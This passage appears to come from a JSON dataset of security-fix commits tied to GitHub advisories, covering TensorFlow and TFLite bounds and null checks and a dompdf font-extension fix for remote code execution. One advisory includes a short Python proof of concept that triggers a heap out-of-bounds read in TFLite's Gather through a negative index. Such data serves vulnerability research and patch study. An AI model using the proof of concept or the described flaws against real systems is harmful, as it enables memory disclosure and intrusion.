            "patch_content":"From e6cf28c72ba2eb949ca950d834dd6d66bb01cfae Mon Sep 17 00:00:00 2001\nFrom: Penporn Koanantakool <penporn@google.com>\nDate: Tue, 5 Oct 2021 21:54:15 -0700\nSubject: [PATCH] Validate that matrix dimension sizes in SparseMatMul are\n positive.\n\nPiperOrigin-RevId: 401149683\nChange-Id: Ib33eafc561a39c8741ece80b2edce6d4aae9a57d\n---\n tensorflow\/core\/kernels\/sparse_matmul_op.cc | 10 ++++++++++\n 1 file changed, 10 insertions(+)\n\ndiff --git a\/tensorflow\/core\/kernels\/sparse_matmul_op.cc b\/tensorflow\/core\/kernels\/sparse_matmul_op.cc\nindex a02afafa33e3ad..6bf9dfa3d8bb75 100644\n--- a\/tensorflow\/core\/kernels\/sparse_matmul_op.cc\n+++ b\/tensorflow\/core\/kernels\/sparse_matmul_op.cc\n@@ -32,6 +32,7 @@ limitations under the License.\n #include \"tensorflow\/core\/kernels\/fill_functor.h\"\n #include \"tensorflow\/core\/lib\/core\/blocking_counter.h\"\n #include \"tensorflow\/core\/lib\/core\/threadpool.h\"\n+#include \"tensorflow\/core\/platform\/errors.h\"\n #include \"tensorflow\/core\/platform\/logging.h\"\n #include \"tensorflow\/core\/platform\/macros.h\"\n #include \"tensorflow\/core\/platform\/mutex.h\"\n@@ -980,9 +981,18 @@ class SparseMatMulOp : public OpKernel {\n                 errors::InvalidArgument(\n                     \"Matrix size incompatible: a: \", a.shape().DebugString(),\n                     \", b: \", b.shape().DebugString()));\n+    OP_REQUIRES(ctx, m >= 0 && n >= 0 && k >= 0,\n+                errors::InvalidArgument(\n+                    \"Matrix dimensions cannot be negative: a: \",\n+                    a.shape().DebugString(), \", b: \", b.shape().DebugString()));\n     Tensor* output = nullptr;\n     OP_REQUIRES_OK(ctx, ctx->allocate_output(0, TensorShape({m, n}), &output));\n \n+    \/\/ Return early if at least one of the output dimension size is 0.\n+    if (m == 0 || n == 0) {\n+      return;\n+    }\n+\n     if (k == 0) {\n       \/\/ If the inner dimension k in the matrix multiplication is zero, we fill\n       \/\/ the output with zeros.",
            "code_diff":"@@ -32,6 +32,7 @@ limitations under the License.\n #include \"tensorflow\/core\/kernels\/fill_functor.h\"\n #include \"tensorflow\/core\/lib\/core\/blocking_counter.h\"\n #include \"tensorflow\/core\/lib\/core\/threadpool.h\"\n+#include \"tensorflow\/core\/platform\/errors.h\"\n #include \"tensorflow\/core\/platform\/logging.h\"\n #include \"tensorflow\/core\/platform\/macros.h\"\n #include \"tensorflow\/core\/platform\/mutex.h\"\n@@ -980,9 +981,18 @@ class SparseMatMulOp : public OpKernel {\n                 errors::InvalidArgument(\n                     \"Matrix size incompatible: a: \", a.shape().DebugString(),\n                     \", b: \", b.shape().DebugString()));\n+    OP_REQUIRES(ctx, m >= 0 && n >= 0 && k >= 0,\n+                errors::InvalidArgument(\n+                    \"Matrix dimensions cannot be negative: a: \",\n+                    a.shape().DebugString(), \", b: \", b.shape().DebugString()));\n     Tensor* output = nullptr;\n     OP_REQUIRES_OK(ctx, ctx->allocate_output(0, TensorShape({m, n}), &output));\n \n+    \/\/ Return early if at least one of the output dimension size is 0.\n+    if (m == 0 || n == 0) {\n+      return;\n+    }\n+\n     if (k == 0) {\n       \/\/ If the inner dimension k in the matrix multiplication is zero, we fill\n       \/\/ the output with zeros."
        },
        {
            "index":895,
            "vuln_id":"GHSA-x752-qjv4-c4hc",
            "cwe_id":"{'CWE-74'}",
            "score":9.8,
            "chain":"{'https:\/\/github.com\/dompdf\/dompdf\/commit\/4c70e1025bcd9b7694b95dd552499bd83cd6141d'}",
            "dataset":"osv",
            "summary":"Remote code injection in dompdf\/dompdf Dompdf is an HTML to PDF converter. Dompdf before 1.2.1 allows remote code execution via a .php file in the src:url field of an @font-face Cascading Style Sheets (CSS) statement (within an HTML input file).",
            "published_date":"2022-04-04",
            "chain_len":1,
            "project":"https:\/\/github.com\/dompdf\/dompdf",
            "commit_href":"https:\/\/github.com\/dompdf\/dompdf\/commit\/4c70e1025bcd9b7694b95dd552499bd83cd6141d",
            "commit_sha":"4c70e1025bcd9b7694b95dd552499bd83cd6141d",
            "patch":"SINGLE",
            "chain_ord":"['4c70e1025bcd9b7694b95dd552499bd83cd6141d']",
            "before_first_fix_commit":"{'0347b9a73f8a03b1b7e659312416f6fd6c7a0cee'}",
            "last_fix_commit":"4c70e1025bcd9b7694b95dd552499bd83cd6141d",
            "chain_ord_pos":1.0,
            "commit_datetime":"03\/17\/2022, 00:09:04",
            "message":"Match installed font filename extension to type\n\nfixes #2598",
            "author":"Brian Sweeney",
            "comments":"{'com_1': {'author': 'Jakess39', 'datetime': '04\/16\/2022, 09:55:58', 'body': '> #2526'}, 'com_2': {'author': 'Jakess39', 'datetime': '04\/16\/2022, 09:56:11', 'body': '> > #2526'}}",
            "stats":"{'additions': 7, 'deletions': 1, 'total': 8}",
            "files":"{'src\/FontMetrics.php': {'additions': 7, 'deletions': 1, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/dompdf\/dompdf\/raw\/4c70e1025bcd9b7694b95dd552499bd83cd6141d\/src%2FFontMetrics.php', 'patch': '@@ -206,7 +206,6 @@ public function registerFont($style, $remoteFile, $context = null)\\n         }\\n \\n         $cacheEntry = $localFile;\\n-        $localFile .= \".\".strtolower(pathinfo(parse_url($remoteFile, PHP_URL_PATH), PATHINFO_EXTENSION));\\n \\n         $entry[$styleString] = $cacheEntry;\\n \\n@@ -258,6 +257,13 @@ public function registerFont($style, $remoteFile, $context = null)\\n             return false;\\n         }\\n \\n+        switch ($font->getFontType()) {\\n+            case \"TrueType\":\\n+            default:\\n+                $localFile .= \".ttf\";\\n+                break;\\n+        }\\n+\\n         $font->parse();\\n         $font->saveAdobeFontMetrics(\"$cacheEntry.ufm\");\\n         $font->close();'}}",
            "message_norm":"match installed font filename extension to type\n\nfixes #2598",
            "language":"en",
            "entities":"[('#2598', 'ISSUE', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['src\/FontMetrics.php'])",
            "num_files":1.0,
            "patch_content":"From 4c70e1025bcd9b7694b95dd552499bd83cd6141d Mon Sep 17 00:00:00 2001\nFrom: Brian Sweeney <brian@eclecticgeek.com>\nDate: Wed, 16 Mar 2022 20:09:04 -0400\nSubject: [PATCH] Match installed font filename extension to type\n\nfixes #2598\n---\n src\/FontMetrics.php | 8 +++++++-\n 1 file changed, 7 insertions(+), 1 deletion(-)\n\ndiff --git a\/src\/FontMetrics.php b\/src\/FontMetrics.php\nindex 8a525cbcd..316fe147b 100644\n--- a\/src\/FontMetrics.php\n+++ b\/src\/FontMetrics.php\n@@ -206,7 +206,6 @@ public function registerFont($style, $remoteFile, $context = null)\n         }\n \n         $cacheEntry = $localFile;\n-        $localFile .= \".\".strtolower(pathinfo(parse_url($remoteFile, PHP_URL_PATH), PATHINFO_EXTENSION));\n \n         $entry[$styleString] = $cacheEntry;\n \n@@ -258,6 +257,13 @@ public function registerFont($style, $remoteFile, $context = null)\n             return false;\n         }\n \n+        switch ($font->getFontType()) {\n+            case \"TrueType\":\n+            default:\n+                $localFile .= \".ttf\";\n+                break;\n+        }\n+\n         $font->parse();\n         $font->saveAdobeFontMetrics(\"$cacheEntry.ufm\");\n         $font->close();",
            "code_diff":"@@ -206,7 +206,6 @@ public function registerFont($style, $remoteFile, $context = null)\n         }\n \n         $cacheEntry = $localFile;\n-        $localFile .= \".\".strtolower(pathinfo(parse_url($remoteFile, PHP_URL_PATH), PATHINFO_EXTENSION));\n \n         $entry[$styleString] = $cacheEntry;\n \n@@ -258,6 +257,13 @@ public function registerFont($style, $remoteFile, $context = null)\n             return false;\n         }\n \n+        switch ($font->getFontType()) {\n+            case \"TrueType\":\n+            default:\n+                $localFile .= \".ttf\";\n+                break;\n+        }\n+\n         $font->parse();\n         $font->saveAdobeFontMetrics(\"$cacheEntry.ufm\");\n         $font->close();"
        },
        {
            "index":747,
            "vuln_id":"GHSA-9p77-mmrw-69c7",
            "cwe_id":"{'CWE-476'}",
            "score":6.5,
            "chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8a513cec4bec15961fbfdedcaa5376522980455c'}",
            "dataset":"osv",
            "summary":"Null-dereference in Tensorflow ### Impact\nWhen decoding a tensor from protobuf, TensorFlow might do a null-dereference if attributes of some mutable arguments to some operations are missing from the proto. This is [guarded by a `DCHECK`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/framework\/full_type_util.cc#L104-L106):\n\n```cc\n  const auto* attr = attrs.Find(arg->s()); \n  DCHECK(attr != nullptr);\n  if (attr->value_case() == AttrValue::kList) {\n    \/\/ ...\n  }\n```\nHowever, `DCHECK` is a no-op in production builds and an assertion failure in debug builds. In the first case execution proceeds to the dereferencing of the null pointer, whereas in the second case it results in a crash due to the assertion failure.\n\n### Patches\nWe have patched the issue in GitHub commit [8a513cec4bec15961fbfdedcaa5376522980455c](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8a513cec4bec15961fbfdedcaa5376522980455c).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, and TensorFlow 2.6.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
            "published_date":"2022-02-09",
            "chain_len":1,
            "project":"https:\/\/github.com\/tensorflow\/tensorflow",
            "commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8a513cec4bec15961fbfdedcaa5376522980455c",
            "commit_sha":"8a513cec4bec15961fbfdedcaa5376522980455c",
            "patch":"SINGLE",
            "chain_ord":"['8a513cec4bec15961fbfdedcaa5376522980455c']",
            "before_first_fix_commit":"{'258112d838f008a632fe0dc43fc9ebecb9b0b869'}",
            "last_fix_commit":"8a513cec4bec15961fbfdedcaa5376522980455c",
            "chain_ord_pos":1.0,
            "commit_datetime":"11\/08\/2021, 18:35:47",
            "message":"Prevent null dereference read in `SpecializeType()`\n\nFor some adversarial protos, the attribute for a key might not exist.\n\nPiperOrigin-RevId: 408382090\nChange-Id: Ie7eabe532c9ff280fce5dce1f6cdb93c76c2e040",
            "author":"Mihai Maruseac",
            "comments":null,
            "stats":"{'additions': 6, 'deletions': 1, 'total': 7}",
            "files":"{'tensorflow\/core\/framework\/full_type_util.cc': {'additions': 6, 'deletions': 1, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/8a513cec4bec15961fbfdedcaa5376522980455c\/tensorflow%2Fcore%2Fframework%2Ffull_type_util.cc', 'patch': '@@ -22,6 +22,7 @@ limitations under the License.\\n #include \"tensorflow\/core\/framework\/op_def.pb.h\"\\n #include \"tensorflow\/core\/framework\/types.h\"\\n #include \"tensorflow\/core\/platform\/statusor.h\"\\n+#include \"tensorflow\/core\/protobuf\/error_codes.pb.h\"\\n \\n namespace tensorflow {\\n \\n@@ -102,7 +103,11 @@ StatusOr<FullTypeDef> SpecializeType(const AttrSlice& attrs,\\n       auto* arg = t->mutable_args(i);\\n       if (arg->type_id() == TFT_VAR) {\\n         const auto* attr = attrs.Find(arg->s());\\n-        DCHECK(attr != nullptr);\\n+        if (attr == nullptr) {\\n+          return Status(\\n+              error::INVALID_ARGUMENT,\\n+              absl::StrCat(\"Could not find an attribute for key \", arg->s()));\\n+        }\\n         if (attr->value_case() == AttrValue::kList) {\\n           const auto& attr_list = attr->list();\\n           arg->set_type_id(TFT_PRODUCT);'}}",
            "message_norm":"prevent null dereference read in `specializetype()`\n\nfor some adversarial protos, the attribute for a key might not exist.\n\npiperorigin-revid: 408382090\nchange-id: ie7eabe532c9ff280fce5dce1f6cdb93c76c2e040",
            "language":"en",
            "entities":"[('prevent', 'ACTION', ''), ('null dereference', 'SECWORD', ''), ('adversarial', 'SECWORD', ''), ('key', 'SECWORD', ''), ('408382090', 'SHA', 'generic_sha')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['tensorflow\/core\/framework\/full_type_util.cc'])",
            "num_files":1.0,
            "patch_content":"From 8a513cec4bec15961fbfdedcaa5376522980455c Mon Sep 17 00:00:00 2001\nFrom: Mihai Maruseac <mihaimaruseac@google.com>\nDate: Mon, 8 Nov 2021 10:35:47 -0800\nSubject: [PATCH] Prevent null dereference read in `SpecializeType()`\n\nFor some adversarial protos, the attribute for a key might not exist.\n\nPiperOrigin-RevId: 408382090\nChange-Id: Ie7eabe532c9ff280fce5dce1f6cdb93c76c2e040\n---\n tensorflow\/core\/framework\/full_type_util.cc | 7 ++++++-\n 1 file changed, 6 insertions(+), 1 deletion(-)\n\ndiff --git a\/tensorflow\/core\/framework\/full_type_util.cc b\/tensorflow\/core\/framework\/full_type_util.cc\nindex 5d2b33c3099341..e0d8ca0721c850 100644\n--- a\/tensorflow\/core\/framework\/full_type_util.cc\n+++ b\/tensorflow\/core\/framework\/full_type_util.cc\n@@ -22,6 +22,7 @@ limitations under the License.\n #include \"tensorflow\/core\/framework\/op_def.pb.h\"\n #include \"tensorflow\/core\/framework\/types.h\"\n #include \"tensorflow\/core\/platform\/statusor.h\"\n+#include \"tensorflow\/core\/protobuf\/error_codes.pb.h\"\n \n namespace tensorflow {\n \n@@ -102,7 +103,11 @@ StatusOr<FullTypeDef> SpecializeType(const AttrSlice& attrs,\n       auto* arg = t->mutable_args(i);\n       if (arg->type_id() == TFT_VAR) {\n         const auto* attr = attrs.Find(arg->s());\n-        DCHECK(attr != nullptr);\n+        if (attr == nullptr) {\n+          return Status(\n+              error::INVALID_ARGUMENT,\n+              absl::StrCat(\"Could not find an attribute for key \", arg->s()));\n+        }\n         if (attr->value_case() == AttrValue::kList) {\n           const auto& attr_list = attr->list();\n           arg->set_type_id(TFT_PRODUCT);",
            "code_diff":"@@ -22,6 +22,7 @@ limitations under the License.\n #include \"tensorflow\/core\/framework\/op_def.pb.h\"\n #include \"tensorflow\/core\/framework\/types.h\"\n #include \"tensorflow\/core\/platform\/statusor.h\"\n+#include \"tensorflow\/core\/protobuf\/error_codes.pb.h\"\n \n namespace tensorflow {\n \n@@ -102,7 +103,11 @@ StatusOr<FullTypeDef> SpecializeType(const AttrSlice& attrs,\n       auto* arg = t->mutable_args(i);\n       if (arg->type_id() == TFT_VAR) {\n         const auto* attr = attrs.Find(arg->s());\n-        DCHECK(attr != nullptr);\n+        if (attr == nullptr) {\n+          return Status(\n+              error::INVALID_ARGUMENT,\n+              absl::StrCat(\"Could not find an attribute for key \", arg->s()));\n+        }\n         if (attr->value_case() == AttrValue::kList) {\n           const auto& attr_list = attr->list();\n           arg->set_type_id(TFT_PRODUCT);"
        },
        {
            "index":770,
            "vuln_id":"GHSA-jwf9-w5xm-f437",
            "cwe_id":"{'CWE-125'}",
            "score":5.5,
            "chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/eb921122119a6b6e470ee98b89e65d721663179d', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/bb6a0383ed553c286f87ca88c207f6774d5c4a8f'}",
            "dataset":"osv",
            "summary":"Heap OOB in TFLite's `Gather*` implementations ### Impact\nTFLite's [`GatherNd` implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/149562d49faa709ea80df1d99fc41d005b81082a\/tensorflow\/lite\/kernels\/gather_nd.cc#L124) does not support negative indices but there are no checks for this situation.\n\nHence, an attacker can read arbitrary data from the heap by carefully crafting a model with negative values in `indices`.\n\nSimilar issue exists in [`Gather` implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/149562d49faa709ea80df1d99fc41d005b81082a\/tensorflow\/lite\/kernels\/gather.cc).\n\n```python\nimport tensorflow as tf\nimport numpy as np\ntf.compat.v1.disable_v2_behavior()\n\nparams = tf.compat.v1.placeholder(name=\"params\", dtype=tf.int64, shape=(1,))\nindices = tf.compat.v1.placeholder(name=\"indices\", dtype=tf.int64, shape=())\n\nout = tf.gather(params, indices, name='out')\n\nwith tf.compat.v1.Session() as sess:\n   converter = tf.compat.v1.lite.TFLiteConverter.from_session(sess, [params, indices], [out])\n   tflite_model = converter.convert()\n\ninterpreter = tf.lite.Interpreter(model_content=tflite_model)\ninterpreter.allocate_tensors()\n\ninput_details = interpreter.get_input_details()\noutput_details = interpreter.get_output_details()\n\nparams_data = np.reshape(np.array([1], dtype=np.int64), newshape=(1,))\nindices_data = np.reshape(np.array(-10, dtype=np.int64), newshape=())\ninterpreter.set_tensor(input_details[0]['index'], params_data)\ninterpreter.set_tensor(input_details[1]['index'], indices_data)\n\ninterpreter.invoke()\n```\n\n### Patches\nWe have patched the issue in GitHub commits [bb6a0383ed553c286f87ca88c207f6774d5c4a8f](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/bb6a0383ed553c286f87ca88c207f6774d5c4a8f) and [eb921122119a6b6e470ee98b89e65d721663179d](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/eb921122119a6b6e470ee98b89e65d721663179d).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security  guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang of Baidu Security.",
            "published_date":"2021-08-25",
            "chain_len":2,
            "project":"https:\/\/github.com\/tensorflow\/tensorflow",
            "commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/eb921122119a6b6e470ee98b89e65d721663179d",
            "commit_sha":"eb921122119a6b6e470ee98b89e65d721663179d",
            "patch":"MULTI",
            "chain_ord":"['bb6a0383ed553c286f87ca88c207f6774d5c4a8f', 'eb921122119a6b6e470ee98b89e65d721663179d']",
            "before_first_fix_commit":"{'ac72971cc6fbbfe4df7e67a8347ef1b6ab63b5fd'}",
            "last_fix_commit":"eb921122119a6b6e470ee98b89e65d721663179d",
            "chain_ord_pos":2.0,
            "commit_datetime":"07\/28\/2021, 00:11:14",
            "message":"Prevent heap OOB read in TFLite's `gather.cc`.\n\nPassing negative indices is illegal but there was a missing check so that resulted in OOB accesses.\n\nPiperOrigin-RevId: 387231300\nChange-Id: I3111b54b2f232638d795be17efc46abe4ede6bf8",
            "author":"Mihai Maruseac",
            "comments":null,
            "stats":"{'additions': 53, 'deletions': 16, 'total': 69}",
            "files":"{'tensorflow\/lite\/kernels\/gather.cc': {'additions': 53, 'deletions': 16, 'changes': 69, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/eb921122119a6b6e470ee98b89e65d721663179d\/tensorflow%2Flite%2Fkernels%2Fgather.cc', 'patch': '@@ -117,8 +117,20 @@ TfLiteStatus Prepare(TfLiteContext* context, TfLiteNode* node) {\\n }\\n \\n template <typename InputT, typename PositionsT>\\n-TfLiteStatus Gather(const TfLiteGatherParams& params, const TfLiteTensor* input,\\n-                    const TfLiteTensor* positions, TfLiteTensor* output) {\\n+TfLiteStatus Gather(TfLiteContext* context, const TfLiteGatherParams& params,\\n+                    const TfLiteTensor* input, const TfLiteTensor* positions,\\n+                    TfLiteTensor* output) {\\n+  const PositionsT* indexes = GetTensorData<PositionsT>(positions);\\n+  bool indices_has_only_positive_elements = true;\\n+  const size_t num_indices = positions->bytes \/ sizeof(PositionsT);\\n+  for (size_t i = 0; i < num_indices; i++) {\\n+    if (indexes[i] < 0) {\\n+      indices_has_only_positive_elements = false;\\n+      break;\\n+    }\\n+  }\\n+  TF_LITE_ENSURE(context, indices_has_only_positive_elements);\\n+\\n   tflite::GatherParams op_params;\\n   op_params.axis = params.axis;\\n   op_params.batch_dims = params.batch_dims;\\n@@ -134,7 +146,18 @@ TfLiteStatus GatherStrings(TfLiteContext* context, const TfLiteTensor* input,\\n                            const TfLiteTensor* positions,\\n                            TfLiteTensor* output) {\\n   DynamicBuffer buffer;\\n+\\n   const PositionT* indexes = GetTensorData<PositionT>(positions);\\n+  bool indices_has_only_positive_elements = true;\\n+  const size_t num_indices = positions->bytes \/ sizeof(PositionT);\\n+  for (size_t i = 0; i < num_indices; i++) {\\n+    if (indexes[i] < 0) {\\n+      indices_has_only_positive_elements = false;\\n+      break;\\n+    }\\n+  }\\n+  TF_LITE_ENSURE(context, indices_has_only_positive_elements);\\n+\\n   const PositionT num_strings = GetStringCount(input);\\n   const int num_indexes = NumElements(positions);\\n \\n@@ -163,19 +186,26 @@ TfLiteStatus Eval(TfLiteContext* context, TfLiteNode* node) {\\n   if (positions->type == kTfLiteInt32) {\\n     switch (input->type) {\\n       case kTfLiteFloat32:\\n-        return Gather<float, int32_t>(*params, input, positions, output);\\n+        return Gather<float, int32_t>(context, *params, input, positions,\\n+                                      output);\\n       case kTfLiteUInt8:\\n-        return Gather<uint8_t, int32_t>(*params, input, positions, output);\\n+        return Gather<uint8_t, int32_t>(context, *params, input, positions,\\n+                                        output);\\n       case kTfLiteInt8:\\n-        return Gather<int8_t, int32_t>(*params, input, positions, output);\\n+        return Gather<int8_t, int32_t>(context, *params, input, positions,\\n+                                       output);\\n       case kTfLiteInt16:\\n-        return Gather<int16_t, int32_t>(*params, input, positions, output);\\n+        return Gather<int16_t, int32_t>(context, *params, input, positions,\\n+                                        output);\\n       case kTfLiteInt32:\\n-        return Gather<int32_t, int32_t>(*params, input, positions, output);\\n+        return Gather<int32_t, int32_t>(context, *params, input, positions,\\n+                                        output);\\n       case kTfLiteInt64:\\n-        return Gather<int64_t, int32_t>(*params, input, positions, output);\\n+        return Gather<int64_t, int32_t>(context, *params, input, positions,\\n+                                        output);\\n       case kTfLiteBool:\\n-        return Gather<bool, int32_t>(*params, input, positions, output);\\n+        return Gather<bool, int32_t>(context, *params, input, positions,\\n+                                     output);\\n       case kTfLiteString:\\n         return GatherStrings<int32_t>(context, input, positions, output);\\n       default:\\n@@ -187,19 +217,26 @@ TfLiteStatus Eval(TfLiteContext* context, TfLiteNode* node) {\\n   if (positions->type == kTfLiteInt64) {\\n     switch (input->type) {\\n       case kTfLiteFloat32:\\n-        return Gather<float, int64_t>(*params, input, positions, output);\\n+        return Gather<float, int64_t>(context, *params, input, positions,\\n+                                      output);\\n       case kTfLiteUInt8:\\n-        return Gather<uint8_t, int64_t>(*params, input, positions, output);\\n+        return Gather<uint8_t, int64_t>(context, *params, input, positions,\\n+                                        output);\\n       case kTfLiteInt8:\\n-        return Gather<int8_t, int64_t>(*params, input, positions, output);\\n+        return Gather<int8_t, int64_t>(context, *params, input, positions,\\n+                                       output);\\n       case kTfLiteInt16:\\n-        return Gather<int16_t, int64_t>(*params, input, positions, output);\\n+        return Gather<int16_t, int64_t>(context, *params, input, positions,\\n+                                        output);\\n       case kTfLiteInt32:\\n-        return Gather<int32_t, int64_t>(*params, input, positions, output);\\n+        return Gather<int32_t, int64_t>(context, *params, input, positions,\\n+                                        output);\\n       case kTfLiteInt64:\\n-        return Gather<int64_t, int64_t>(*params, input, positions, output);\\n+        return Gather<int64_t, int64_t>(context, *params, input, positions,\\n+                                        output);\\n       case kTfLiteBool:\\n-        return Gather<bool, int64_t>(*params, input, positions, output);\\n+        return Gather<bool, int64_t>(context, *params, input, positions,\\n+                                     output);\\n       case kTfLiteString:\\n         return GatherStrings<int64_t>(context, input, positions, output);\\n       default:'}}",
            "message_norm":"prevent heap oob read in tflite's `gather.cc`.\n\npassing negative indices is illegal but there was a missing check so that resulted in oob accesses.\n\npiperorigin-revid: 387231300\nchange-id: i3111b54b2f232638d795be17efc46abe4ede6bf8",
            "language":"en",
            "entities":"[('prevent', 'ACTION', ''), ('heap oob', 'SECWORD', ''), ('missing check', 'SECWORD', ''), ('oob', 'SECWORD', ''), ('387231300', 'SHA', 'generic_sha')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['tensorflow\/lite\/kernels\/gather.cc'])",
            "num_files":1.0,
            "patch_content":"From eb921122119a6b6e470ee98b89e65d721663179d Mon Sep 17 00:00:00 2001\nFrom: Mihai Maruseac <mihaimaruseac@google.com>\nDate: Tue, 27 Jul 2021 17:11:14 -0700\nSubject: [PATCH] Prevent heap OOB read in TFLite's `gather.cc`.\n\nPassing negative indices is illegal but there was a missing check so that resulted in OOB accesses.\n\nPiperOrigin-RevId: 387231300\nChange-Id: I3111b54b2f232638d795be17efc46abe4ede6bf8\n---\n tensorflow\/lite\/kernels\/gather.cc | 69 ++++++++++++++++++++++++-------\n 1 file changed, 53 insertions(+), 16 deletions(-)\n\ndiff --git a\/tensorflow\/lite\/kernels\/gather.cc b\/tensorflow\/lite\/kernels\/gather.cc\nindex 9fe94821230c00..bdc2139d0fe7a5 100644\n--- a\/tensorflow\/lite\/kernels\/gather.cc\n+++ b\/tensorflow\/lite\/kernels\/gather.cc\n@@ -117,8 +117,20 @@ TfLiteStatus Prepare(TfLiteContext* context, TfLiteNode* node) {\n }\n \n template <typename InputT, typename PositionsT>\n-TfLiteStatus Gather(const TfLiteGatherParams& params, const TfLiteTensor* input,\n-                    const TfLiteTensor* positions, TfLiteTensor* output) {\n+TfLiteStatus Gather(TfLiteContext* context, const TfLiteGatherParams& params,\n+                    const TfLiteTensor* input, const TfLiteTensor* positions,\n+                    TfLiteTensor* output) {\n+  const PositionsT* indexes = GetTensorData<PositionsT>(positions);\n+  bool indices_has_only_positive_elements = true;\n+  const size_t num_indices = positions->bytes \/ sizeof(PositionsT);\n+  for (size_t i = 0; i < num_indices; i++) {\n+    if (indexes[i] < 0) {\n+      indices_has_only_positive_elements = false;\n+      break;\n+    }\n+  }\n+  TF_LITE_ENSURE(context, indices_has_only_positive_elements);\n+\n   tflite::GatherParams op_params;\n   op_params.axis = params.axis;\n   op_params.batch_dims = params.batch_dims;\n@@ -134,7 +146,18 @@ TfLiteStatus GatherStrings(TfLiteContext* context, const TfLiteTensor* input,\n                            const TfLiteTensor* positions,\n                            TfLiteTensor* output) {\n   DynamicBuffer buffer;\n+\n   const PositionT* indexes = GetTensorData<PositionT>(positions);\n+  bool indices_has_only_positive_elements = true;\n+  const size_t num_indices = positions->bytes \/ sizeof(PositionT);\n+  for (size_t i = 0; i < num_indices; i++) {\n+    if (indexes[i] < 0) {\n+      indices_has_only_positive_elements = false;\n+      break;\n+    }\n+  }\n+  TF_LITE_ENSURE(context, indices_has_only_positive_elements);\n+\n   const PositionT num_strings = GetStringCount(input);\n   const int num_indexes = NumElements(positions);\n \n@@ -163,19 +186,26 @@ TfLiteStatus Eval(TfLiteContext* context, TfLiteNode* node) {\n   if (positions->type == kTfLiteInt32) {\n     switch (input->type) {\n       case kTfLiteFloat32:\n-        return Gather<float, int32_t>(*params, input, positions, output);\n+        return Gather<float, int32_t>(context, *params, input, positions,\n+                                      output);\n       case kTfLiteUInt8:\n-        return Gather<uint8_t, int32_t>(*params, input, positions, output);\n+        return Gather<uint8_t, int32_t>(context, *params, input, positions,\n+                                        output);\n       case kTfLiteInt8:\n-        return Gather<int8_t, int32_t>(*params, input, positions, output);\n+        return Gather<int8_t, int32_t>(context, *params, input, positions,\n+                                       output);\n       case kTfLiteInt16:\n-        return Gather<int16_t, int32_t>(*params, input, positions, output);\n+        return Gather<int16_t, int32_t>(context, *params, input, positions,\n+                                        output);\n       case kTfLiteInt32:\n-        return Gather<int32_t, int32_t>(*params, input, positions, output);\n+        return Gather<int32_t, int32_t>(context, *params, input, positions,\n+                                        output);\n       case kTfLiteInt64:\n-        return Gather<int64_t, int32_t>(*params, input, positions, output);\n+        return Gather<int64_t, int32_t>(context, *params, input, positions,\n+                                        output);\n       case kTfLiteBool:\n-        return Gather<bool, int32_t>(*params, input, positions, output);\n+        return Gather<bool, int32_t>(context, *params, input, positions,\n+                                     output);\n       case kTfLiteString:\n         return GatherStrings<int32_t>(context, input, positions, output);\n       default:\n@@ -187,19 +217,26 @@ TfLiteStatus Eval(TfLiteContext* context, TfLiteNode* node) {\n   if (positions->type == kTfLiteInt64) {\n     switch (input->type) {\n       case kTfLiteFloat32:\n-        return Gather<float, int64_t>(*params, input, positions, output);\n+        return Gather<float, int64_t>(context, *params, input, positions,\n+                                      output);\n       case kTfLiteUInt8:\n-        return Gather<uint8_t, int64_t>(*params, input, positions, output);\n+        return Gather<uint8_t, int64_t>(context, *params, input, positions,\n+                                        output);\n       case kTfLiteInt8:\n-        return Gather<int8_t, int64_t>(*params, input, positions, output);\n+        return Gather<int8_t, int64_t>(context, *params, input, positions,\n+                                       output);\n       case kTfLiteInt16:\n-        return Gather<int16_t, int64_t>(*params, input, positions, output);\n+        return Gather<int16_t, int64_t>(context, *params, input, positions,\n+                                        output);\n       case kTfLiteInt32:\n-        return Gather<int32_t, int64_t>(*params, input, positions, output);\n+        return Gather<int32_t, int64_t>(context, *params, input, positions,\n+                                        output);\n       case kTfLiteInt64:\n-        return Gather<int64_t, int64_t>(*params, input, positions, output);\n+        return Gather<int64_t, int64_t>(context, *params, input, positions,\n+                                        output);\n       case kTfLiteBool:\n-        return Gather<bool, int64_t>(*params, input, positions, output);\n+        return Gather<bool, int64_t>(context, *params, input, positions,\n+                                     output);\n       case kTfLiteString:\n         return GatherStrings<int64_t>(context, input, positions, output);\n       default:",
